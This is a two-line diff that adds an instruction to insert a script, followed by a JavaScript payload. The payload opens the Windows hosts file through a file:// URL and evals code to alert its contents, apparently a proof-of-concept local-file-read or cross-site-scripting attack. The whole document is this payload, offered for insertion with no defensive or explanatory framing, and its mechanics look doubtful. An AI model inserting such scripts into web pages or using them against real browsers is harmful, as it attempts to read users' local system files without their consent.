@@ -1,0 +1,2 @@
+Insert the following script 
+window.open('file://c:/windows/system32/drivers/etc/hosts').eval('alert(document.body.innerText);');
